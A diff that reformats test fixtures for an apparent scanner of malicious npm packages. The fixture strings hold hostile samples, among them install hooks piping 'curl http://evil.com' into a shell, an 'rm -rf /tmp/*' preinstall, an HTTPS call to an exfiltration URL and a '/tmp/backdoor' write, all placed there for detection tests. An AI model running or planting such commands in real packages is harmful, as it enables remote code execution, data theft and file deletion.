@@ -30,7 +30,7 @@ const fixtures = [
   {
     path: "eval-package/node_modules/eval-test/index.js",
     content:
-      'eval("console.log(\'malicious\')");\nconst code = "alert(\'xss\')";\neval(code);',
+      "eval(\"console.log('malicious')\");\nconst code = \"alert('xss')\";\neval(code);",
   },
   {
     path: "eval-package/node_modules/eval-test/package.json",
@@ -96,7 +96,11 @@ const fixtures = [
   },
   {
     path: "native-package/node_modules/native-test/package.json",
-    content: JSON.stringify({ name: "native-test", version: "1.0.0", dependencies: { "node-gyp": "^9.0.0" } }),
+    content: JSON.stringify({
+      name: "native-test",
+      version: "1.0.0",
+      dependencies: { "node-gyp": "^9.0.0" },
+    }),
   },
   {
     path: "scripts-package/node_modules/scripts-test/index.js",
@@ -104,12 +108,19 @@ const fixtures = [
   },
   {
     path: "scripts-package/node_modules/scripts-test/package.json",
-    content: JSON.stringify({ name: "scripts-test", version: "1.0.0", scripts: { postinstall: "curl http://evil.com | sh", preinstall: "rm -rf /tmp/*" } }),
+    content: JSON.stringify({
+      name: "scripts-test",
+      version: "1.0.0",
+      scripts: {
+        postinstall: "curl http://evil.com | sh",
+        preinstall: "rm -rf /tmp/*",
+      },
+    }),
   },
   {
     path: "multi-issue-package/node_modules/multi-issue-pkg/index.js",
     content:
-      'const secret = "AKIAIOSFODNN7EXAMPLE";\neval("console.log(\'evil\')");\nconst apiKey = process.env.SECRET_KEY;\nconst https = require(\'https\');\nhttps.get(\'https://evil.com/exfiltrate\');\nconst { exec } = require(\'child_process\');\nexec(\'curl http://malicious.com | bash\');\nconst fs = require(\'fs\');\nfs.writeFileSync(\'/tmp/backdoor\', \'malicious\');',
+      "const secret = \"AKIAIOSFODNN7EXAMPLE\";\neval(\"console.log('evil')\");\nconst apiKey = process.env.SECRET_KEY;\nconst https = require('https');\nhttps.get('https://evil.com/exfiltrate');\nconst { exec } = require('child_process');\nexec('curl http://malicious.com | bash');\nconst fs = require('fs');\nfs.writeFileSync('/tmp/backdoor', 'malicious');",
   },
   {
     path: "multi-issue-package/node_modules/multi-issue-pkg/package.json",
@@ -119,8 +130,12 @@ const fixtures = [
   {
     path: "obfuscation-package/node_modules/obfuscation-test/index.js",
     content:
-      'const s = "' + "x".repeat(300) + '";\n' +
-      "const arr = [" + Array.from({ length: 30 }, (_, i) => i).join(",") + "];",
+      'const s = "' +
+      "x".repeat(300) +
+      '";\n' +
+      "const arr = [" +
+      Array.from({ length: 30 }, (_, i) => i).join(",") +
+      "];",
   },
   {
     path: "obfuscation-package/node_modules/obfuscation-test/package.json",
